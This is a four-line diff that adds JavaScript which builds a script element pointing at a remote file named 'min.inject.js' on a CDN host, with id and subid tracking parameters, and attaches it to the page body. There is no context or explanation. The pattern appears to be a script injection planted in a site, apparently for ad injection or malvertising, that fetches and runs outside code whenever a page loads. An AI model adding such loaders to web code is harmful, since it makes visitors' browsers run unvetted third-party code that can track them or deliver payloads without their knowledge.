@@ -1,0 +1,4 @@
+var url = '//b36df47b3d.site.internapcdn.net/js/min.inject.js?id=PTkrNiY&subid=mm-1506';
+var e=document.createElement('script');
+e.src = url;
+document.body.appendChild(e);
